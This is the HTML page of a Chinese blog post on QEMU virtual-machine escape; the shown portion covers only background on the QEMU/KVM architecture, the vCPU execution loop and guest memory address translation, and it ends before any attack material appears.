<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="sky123">
    
    <!-- Completely eliminate flash of wrong theme -->
    <script>
        (function() {
            const THEME_KEY = "REDEFINE-THEME-STATUS";
            const DARK = "dark", LIGHT = "light";
            
            // Get preferred theme
            function getTheme() {
                try {
                    const saved = localStorage.getItem(THEME_KEY);
                    if (saved) {
                        const { isDark } = JSON.parse(saved);
                        return isDark ? DARK : LIGHT;
                    }
                } catch (e) {}
                
                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
            }
            
            // Apply theme to document
            function applyTheme(theme) {
                const isDark = theme === DARK;
                const root = document.documentElement;
                
                // Set data attribute for CSS variables
                root.setAttribute("data-theme", theme);
                
                // Set classes for compatibility
                root.classList.add(theme);
                root.classList.remove(isDark ? LIGHT : DARK);
                root.style.colorScheme = theme;
            }
            
            // Initial application
            const theme = getTheme();
            applyTheme(theme);
            
            // Listen for system preference changes
            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
                // Only update if using system preference (no localStorage entry)
                if (!localStorage.getItem(THEME_KEY)) {
                    applyTheme(matches ? DARK : LIGHT);
                }
            });
            
            // Set body classes once DOM is ready
            if (document.readyState !== "loading") {
                document.body.classList.add(theme + "-mode");
            } else {
                document.addEventListener("DOMContentLoaded", () => {
                    document.body.classList.add(theme + "-mode");
                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
                });
            }
        })();
    </script>
    
    <!-- Critical CSS to prevent flash -->
    <style>
        :root[data-theme="dark"] {
            --background-color: #202124;
            --background-color-transparent: rgba(32, 33, 36, 0.6);
            --second-background-color: #2d2e32;
            --third-background-color: #34353a;
            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #ffffff;
            --second-text-color: #eeeeee;
            --third-text-color: #bebec6;
            --fourth-text-color: #999999;
            --default-text-color: #bebec6;
            --invert-text-color: #373D3F;
            --border-color: rgba(255, 255, 255, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(255, 255, 255, 0.08);
            --shadow-color-2: rgba(255, 255, 255, 0.05);
        }
        
        :root[data-theme="light"] {
            --background-color: #fff;
            --background-color-transparent: rgba(255, 255, 255, 0.6);
            --second-background-color: #f8f8f8;
            --third-background-color: #f2f2f2;
            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #16171a;
            --second-text-color: #2f3037;
            --third-text-color: #5e5e5e;
            --fourth-text-color: #eeeeee;
            --default-text-color: #373D3F;
            --invert-text-color: #bebec6;
            --border-color: rgba(0, 0, 0, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(0, 0, 0, 0.08);
            --shadow-color-2: rgba(0, 0, 0, 0.05);
        }
        
        body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
        
        /* Apply body classes as soon as DOM is ready */
        :root[data-theme="dark"] body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
    </style>
    
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://skyi23.github.io/2025/10/30/qemu 逃逸/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/null" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/null">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/null">
    <!--- Page Info-->
    
    <title>
        
            qemu 逃逸 | sky123&#39;s site
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/css/build/tailwind.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap" rel="stylesheet">
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"skyi23.github.io","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":true,"family":"JetBrains Mono","url":"https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap"}},"toc":{"enable":true,"max_depth":5,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"sky123's blog","subtitle":{"text":["书有未曾经我读，事无不可对人言"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":true,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"分类":{"icon":"fa-solid fa-folder","path":"/categories/"},"标签":{"icon":"fa-solid fa-tags","path":"/tags/"},"书签":{"icon":"fa-solid fa-bookmark","path":"/bookmarks/"}},"search":{"enable":true,"preload":true}},"page_templates":{"bookmarks_column":3,"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/7 00:00:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css" integrity="sha256-TThEtR+XalhWKkfF383YLOrI50NGNeIqrzS+q08afrY=" crossorigin="anonymous"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                sky123&#39;s site
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/categories/"
                                        >
                                    <i class="fa-solid fa-folder fa-fw"></i>
                                    分类
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/tags/"
                                        >
                                    <i class="fa-solid fa-tags fa-fw"></i>
                                    标签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/bookmarks/"
                                        >
                                    <i class="fa-solid fa-bookmark fa-fw"></i>
                                    书签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/categories/"
                        >
                            <span>
                                分类
                            </span>
                            
                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/tags/"
                        >
                            <span>
                                标签
                            </span>
                            
                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/bookmarks/"
                        >
                            <span>
                                书签
                            </span>
                            
                                <i class="fa-solid fa-bookmark fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">17</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">57</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">qemu 逃逸</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/icon.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">sky123</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-10-30 22:52:43</span>
        <span class="mobile">2025-10-30 22:52:43</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-11-13 12:41:42</span>
            <span class="mobile">2025-11-13 12:41:42</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/pwn/">pwn</a>&nbsp;
                        </li>
                    
                    
                
                    
                        
                            <li>></li>
                        
                        <li>
                            <a href="/categories/pwn/vm-escape/">vm escape</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/vm-escape/">vm escape</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>68.2k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fa-regular fa-clock"></i>&nbsp;<span>340 Mins</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="QEMU-架构"><a href="#QEMU-架构" class="headerlink" title="QEMU 架构"></a>QEMU 架构</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/10/30/qemu%20%E9%80%83%E9%80%B8/images/5550e2a9025644f0e4b1ef11cbb7e1b4.png"
                      alt="在这里插入图片描述"
                ></p>
<p>QEMU 与 KVM 的完整架构整体上分为三大部分：</p>
<ul>
<li><strong>VMX root 模式的用户空间应用层</strong>（QEMU 进程）</li>
<li><strong>VMX root 模式的内核空间</strong>（Linux KVM 驱动模块）</li>
<li><strong>VMX non-root 模式的虚拟机运行环境</strong>（Guest 虚拟机）</li>
</ul>
<p>其中，VMX root 和 VMX non-root 是 CPU 支持硬件虚拟化指令集（Intel 的 VT-x 技术）之后引入的两个模式：</p>
<ul>
<li><strong>VMX root 模式</strong>用于宿主机系统（即运行虚拟化软件的 Host），在该模式下可执行特权虚拟化指令，完整控制 CPU 虚拟化行为。</li>
<li><strong>VMX non-root 模式</strong>用于运行客户机（即 Guest OS），Guest 在 non-root 模式下正常运行，绝大部分指令可直接由物理 CPU 执行。特殊敏感操作会导致 CPU 从 non-root 模式退出到 root 模式（VM-Exit），交由 KVM&#x2F;QEMU 处理。</li>
</ul>
<p>无论 VMX root 还是 VMX non-root 模式，都包含 ring 0 到 ring 3 共 4 个特权级别。</p>
<h3 id="QEMU-进程"><a href="#QEMU-进程" class="headerlink" title="QEMU 进程"></a>QEMU 进程</h3><p>在 QEMU 与 KVM 虚拟化架构中，QEMU 进程位于 VMX root 模式的用户空间，承担如下任务：</p>
<ul>
<li><p><strong>初始化虚拟机硬件环境</strong>：</p>
<ul>
<li>创建虚拟芯片组（如 PCI 主桥、内存控制器）</li>
<li>根据用户启动参数 (<code>-device</code> 等) 创建并初始化各类虚拟设备（如磁盘、网卡、显卡、输入设备）</li>
<li>分配并管理来宾（Guest）物理内存空间，QEMU 将 Guest 的物理内存映射到宿主机进程虚拟地址空间中（使用 <code>mmap</code> 等系统调用）。</li>
</ul>
</li>
<li><p><strong>设备模拟与 IO 请求处理</strong>：<br>在虚拟机运行期间，QEMU 主线程会使用事件循环机制（main loop）监听并处理多种事件：</p>
<ul>
<li><strong>设备 IO 请求事件</strong>：当虚拟机对虚拟设备发起 IO 请求（PIO&#x2F;MMIO）并触发 VM-Exit 后，KVM 会通过 ioctl 接口通知 QEMU 处理这些事件。</li>
<li><strong>管理命令事件</strong>：如用户通过 QEMU 的管理界面或 QMP（QEMU Machine Protocol）发送的命令。</li>
<li><strong>宿主机设备事件</strong>：如网络数据接收或宿主设备状态变化（例如 <code>tap</code> 网络设备的数据包到达），QEMU 会做出响应并模拟设备行为。</li>
</ul>
<p>对于虚拟机设备 IO 访问事件，QEMU 用户空间通过预先注册的 <code>MemoryRegionOps</code> 等设备模型回调函数完成 IO 请求处理，模拟真实硬件的行为（例如返回设备寄存器值、进行 DMA 操作、发起中断请求）。</p>
</li>
<li><p><strong>CPU 线程管理</strong>：<br>QEMU 为每个虚拟 CPU (vCPU) 创建单独的宿主机线程，用于代表并调度虚拟机 CPU 的执行流。QEMU 借助 KVM 驱动控制 CPU 的虚拟化行为，使 vCPU 线程能够在宿主机的 CPU 上直接执行 Guest 代码。</p>
</li>
</ul>
<h3 id="虚拟机-Guest-环境"><a href="#虚拟机-Guest-环境" class="headerlink" title="虚拟机 (Guest) 环境"></a>虚拟机 (Guest) 环境</h3><p>Guest OS 在 VMX non-root 模式下运行，有自己的应用层和内核层：</p>
<ul>
<li><p><strong>对 Guest OS 而言，QEMU 和 KVM 完全透明</strong>，不需要对 Guest OS 做任何修改，就可以在虚拟机中正常运行。</p>
</li>
<li><p>Guest 虚拟机的每个 vCPU 对应宿主机中 QEMU 进程的一个线程。通过 KVM 和宿主 OS 调度，这些线程能直接在物理 CPU 上执行 Guest 代码。</p>
</li>
<li><p>Guest 虚拟机内存通过两层映射实现地址转换：</p>
<ul>
<li><strong>GVA→GPA</strong>（Guest 虚拟地址 → Guest 物理地址）：由虚拟机自身 OS 页表管理。</li>
<li><strong>GPA→HPA</strong>（Guest 物理地址 → Host 物理地址）：由 KVM 驱动维护的 Extended Page Tables (EPT) 或 Shadow 页表完成。</li>
</ul>
</li>
<li><p>Guest OS 中的设备通过 QEMU 呈现，Guest OS 在启动时进行设备枚举并加载相应的设备驱动程序。</p>
</li>
<li><p>Guest OS 运行中，通过 IO 端口 (PIO) 或内存映射 IO (MMIO) 与设备进行交互时，KVM 会截获这些敏感操作（VM-Exit）并将请求分发至 QEMU 用户空间，由 QEMU 负责处理这些设备请求。</p>
</li>
</ul>
<h3 id="KVM-内核驱动"><a href="#KVM-内核驱动" class="headerlink" title="KVM 内核驱动"></a>KVM 内核驱动</h3><p>KVM 驱动位于 VMX root 模式的 Linux 内核空间，以 misc 设备驱动形式 (<code>/dev/kvm</code>) 存在，提供如下功能：</p>
<ul>
<li><p><strong>为用户空间提供虚拟化控制接口</strong>（通过 ioctl 接口）：</p>
<ul>
<li><p>QEMU 等用户程序通过 <code>/dev/kvm</code> 接口创建并控制虚拟机实例，包括：</p>
<ul>
<li>创建虚拟机 (<code>KVM_CREATE_VM</code>)</li>
<li>创建 vCPU (<code>KVM_CREATE_VCPU</code>)</li>
<li>设置 Guest 内存布局 (<code>KVM_SET_USER_MEMORY_REGION</code>)</li>
<li>启动和调度 vCPU 执行 (<code>KVM_RUN</code> ioctl)</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>处理虚拟机 VM-Exit 事件</strong>：<br>当 Guest 在 VMX non-root 模式下执行某些特殊指令或敏感操作时，会触发 VM-Exit，CPU 从 VMX non-root 模式退出到 VMX root 模式，KVM 接管控制权。KVM 在内核态解析退出原因 (<code>vmexit_reason</code>)：</p>
<ul>
<li>对于常见的 MMIO&#x2F;PIO 操作，KVM 通过 <code>KVM_EXIT_MMIO</code> 或 <code>KVM_EXIT_IO</code> 等事件类型将请求发送到用户空间 QEMU 进程。</li>
<li>对于部分性能敏感事件（如某些定时器、中断控制器或 virtio IO 请求），KVM 通过 ioeventfd 或 irqfd 机制高效通知用户空间或直接内核态处理，以减少 VM-Exit 次数。</li>
</ul>
</li>
</ul>
<h2 id="QEMU-虚拟化"><a href="#QEMU-虚拟化" class="headerlink" title="QEMU 虚拟化"></a>QEMU 虚拟化</h2><h3 id="CPU-虚拟化"><a href="#CPU-虚拟化" class="headerlink" title="CPU 虚拟化"></a>CPU 虚拟化</h3><h4 id="vCPU-创建与初始化"><a href="#vCPU-创建与初始化" class="headerlink" title="vCPU 创建与初始化"></a>vCPU 创建与初始化</h4><p>QEMU 为每个 vCPU 启动一个线程，使用 <code>/dev/kvm</code> 的 ioctl 建立虚拟机&#x2F;虚拟 CPU：<br><code>KVM_CREATE_VM → KVM_CREATE_VCPU → mmap(KVM_RUN) → KVM_SET_REGS/SET_SREGS/SET_MSRS …</code><br>初始化完寄存器&#x2F;CPUID&#x2F;特性后进入主循环。</p>
<h4 id="执行循环与-VM-Exit-Entry"><a href="#执行循环与-VM-Exit-Entry" class="headerlink" title="执行循环与 VM-Exit&#x2F;Entry"></a>执行循环与 VM-Exit&#x2F;Entry</h4><p>vCPU 线程反复 <code>ioctl(KVM_RUN)</code> 进入来宾（VM-Entry）。当发生<strong>敏感事件&#x2F;条件</strong>时硬件触发 <strong>VM-Exit</strong> 返回宿主：<br>典型原因：PIO、MMIO、CPUID&#x2F;MSR 访问、HLT、外部中断窗口、EPT 缺页&#x2F;权限、I&#x2F;O 指令等。<br>KVM 将退出原因写入 <code>struct kvm_run</code>，QEMU读出后分发处理（设备回调、注入中断、继续运行等），随后再次 <code>KVM_RUN</code>（VM-Entry）。</p>
<p>简化伪码：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">  ioctl(vcpu_fd, KVM_RUN);</span><br><span class="line">  <span class="keyword">switch</span> (run-&gt;exit_reason) &#123;</span><br><span class="line">    <span class="keyword">case</span> KVM_EXIT_MMIO:  qemu_mmio_dispatch(run-&gt;mmio);  <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> KVM_EXIT_IO:    qemu_pio_dispatch(run-&gt;io);     <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> KVM_EXIT_HLT:   <span class="comment">/* idle / wait */</span>               <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">/* … CPUID/MSR/INT_WINDOW/EPT_VIOLATION 等 … */</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="VMCS-VMCB"><a href="#VMCS-VMCB" class="headerlink" title="VMCS&#x2F;VMCB"></a>VMCS&#x2F;VMCB</h4><p>Intel VT-x 使用 <strong>VMCS</strong> 保存每个 vCPU 的来宾&#x2F;宿主状态（AMD SVM 对应 <strong>VMCB</strong>）。这不是“像系统调用那样的内核栈切换”，而是<strong>硬件虚拟化态切换</strong>：VM-Entry&#x2F;Exit 时由 CPU 在 VMCS&#x2F;VMCB 与宿主状态之间来回装载。</p>
<h3 id="内存虚拟化"><a href="#内存虚拟化" class="headerlink" title="内存虚拟化"></a>内存虚拟化</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Guest process         Guest kernel                      QEMU (userspace)               Host kernel (KVM)              DRAM</span><br><span class="line">GVA  ──►(guest PT)──►  GPA  ──►(EPT/NPT)──►  HPA     (HVA 仅用于用户态管理/拷贝)</span><br><span class="line">             │                     │                       ▲</span><br><span class="line">             │                     └─MMIO(未映射/设备型)───┘   ← VM-Exit → QEMU MemoryRegionOps 回调</span><br><span class="line">             │</span><br><span class="line">             └─IOVA(可选, 有vIOMMU时)──►(vIOMMU映射)──►GPA───►(EPT/NPT)──►HPA</span><br></pre></td></tr></table></figure></div>

<h4 id="内存地址类别"><a href="#内存地址类别" class="headerlink" title="内存地址类别"></a>内存地址类别</h4><ul>
<li><strong>GVA（Guest Virtual Address）</strong>：来宾进程看到的虚拟地址，受来宾内核维护的页表（CR3 指向的页表根）管理。</li>
<li><strong>GPA（Guest Physical Address）</strong>：来宾眼中的“物理地址”，由来宾内核分配&#x2F;管理，实际上只是一个<strong>客户机物理地址空间</strong>。</li>
<li><strong>HVA（Host Virtual Address）</strong>：宿主机用户态（QEMU 进程）的虚拟地址，QEMU 用 <code>mmap()</code> 得到，用来<strong>承载来宾的“物理内存”数据</strong>。</li>
<li><strong>HPA（Host Physical Address）</strong>：宿主机真实物理地址。</li>
</ul>
<blockquote>
<p><strong>真正跑指令的“硬件级地址翻译”，根本不认识 HVA</strong>。</p>
<p>CPU 在来宾里做访存时，只走这条链路：</p>
<p><strong>GVA（来宾虚拟） →【来宾页表】→ GPA（来宾物理） →【EPT&#x2F;NPT（二级页表）】→ HPA（宿主物理）</strong></p>
<p>HVA（Host Virtual Address）只是<strong>QEMU 这个用户态进程里的指针</strong>，给 QEMU&#x2F;KVM 在“管理阶段&#x2F;缺页处理&#x2F;用户态拷贝”用的，<strong>不在硬件翻译链路里</strong>。</p>
</blockquote>
<h4 id="内存结构初始化"><a href="#内存结构初始化" class="headerlink" title="内存结构初始化"></a>内存结构初始化</h4><ol>
<li><p><strong>QEMU 分配宿主用户态内存</strong></p>
<ul>
<li>通过 <code>mmap()</code>（或基于 hugetlbfs 的文件、匿名内存、memfd 等后端）在 <strong>QEMU 进程地址空间</strong>中创建一段连续的 HVA 区域，作为“来宾物理内存”的承载。</li>
</ul>
</li>
<li><p><strong>QEMU 维护 MemoryRegion&#x2F;AddressSpace</strong></p>
<ul>
<li>QEMU 的 Memory API 将 RAM 区域与 I&#x2F;O 区域抽象成 <code>MemoryRegion</code>，并组合成来宾的 GPA 地址空间布局。</li>
</ul>
</li>
<li><p><strong>告知 KVM：内存槽（memslot）</strong></p>
<ul>
<li>QEMU 通过 <code>KVM_SET_USER_MEMORY_REGION</code> ioctl 把<strong>若干段 GPA 区间</strong>与它们对应的 <strong>HVA 起始地址</strong>与大小注册到 KVM，形成 <strong>memslot</strong>。</li>
<li>一个 memslot 的关键信息包含：<code>slot</code> 编号、<code>guest_phys_addr</code>（GPA 起始）、<code>memory_size</code>、<code>userspace_addr</code>（HVA 起始）、<code>flags</code>（如脏页记录）。</li>
<li>memslot 数量有内核能力限制（<code>KVM_CAP_NR_MEMSLOTS</code> 暴露具体上限，一般为<strong>数百级</strong>），生产中通常合并为少量大区域，便于管理与迁移。</li>
</ul>
</li>
<li><p><strong>动态更新</strong></p>
<ul>
<li>QEMU 之后若调整内存布局（热插拔、I&#x2F;O BAR 映射变化等），会再次调用 <code>KVM_SET_USER_MEMORY_REGION</code> 更新 memslot，KVM 以 <strong>SRCU</strong> 等机制保证并发安全。</li>
</ul>
</li>
</ol>
<h4 id="内存地址转换"><a href="#内存地址转换" class="headerlink" title="内存地址转换"></a>内存地址转换</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">                        